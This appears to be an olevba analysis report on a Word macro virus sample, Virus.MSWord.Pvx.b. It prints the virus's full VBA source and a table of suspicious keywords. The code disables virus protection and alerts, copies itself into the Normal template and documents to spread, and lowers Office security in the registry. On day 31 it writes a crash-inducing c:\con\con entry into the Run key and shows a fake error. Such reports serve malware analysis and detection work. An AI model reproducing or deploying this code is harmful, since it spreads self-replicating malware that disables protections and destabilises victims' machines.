olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pvx.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pvx.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO concon.bas 
in file: Virus.MSWord.Pvx.b - OLE stream: 'Macros/VBA/concon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Dim FY, SNP
FY = (Rnd * 0)
SNP = (Rnd * 0)
Options.VirusProtection = FY
Options.SaveNormalPrompt = SNP
Application.EnableCancelKey = wCancelDisabled
Application.DisplayStatusBar = (Rnd * 0)
Application.ScreenUpdating = (Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
CommandBars("Tools").Controls("Macro").Delete
Const Exportf = "c:\boot.386"
Const Ego = "concon"
Set ADoc = ActiveDocument.VBProject.VBComponents
Set NTmp = NormalTemplate.VBProject.VBComponents
ADoc(Ego).Export Exportf
NTmp(Ego).Export Exportf
For I = 1 To NTmp.Count
If NTmp(I).Name = Ego Then NtmpOK = True
Next I
For I = 1 To ADoc.Count
If ADoc(I).Name = Ego Then DocOK = True
Next I
If DocOK = True And NtmpOK = False Then Set Stoj = NormalTemplate.VBProject _
Else: If DocOK = False And NtmpOK = True Then Set Stoj = ActiveDocument.VBProject
Stoj.VBComponents.Import Exportf
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
Call Pay
End Sub
Sub Pay()
Dim Xday, Strn
Xday = Date
Strn = Format(Xday, "d")
If Strn = 31 Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "") = "c:\con\con"
Dim Msg, Style, Title, Response
Msg = "Shutdown all applications and reboot"
Style = vbOK + vbCritical + vbSystemModal
Title = "Error"
Response = MsgBox(Msg, Style, Title)
End If
' (c) Pvx 2000 only for research purposes
' concon exploit virus (word97/2000 compatible) dont distribute
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

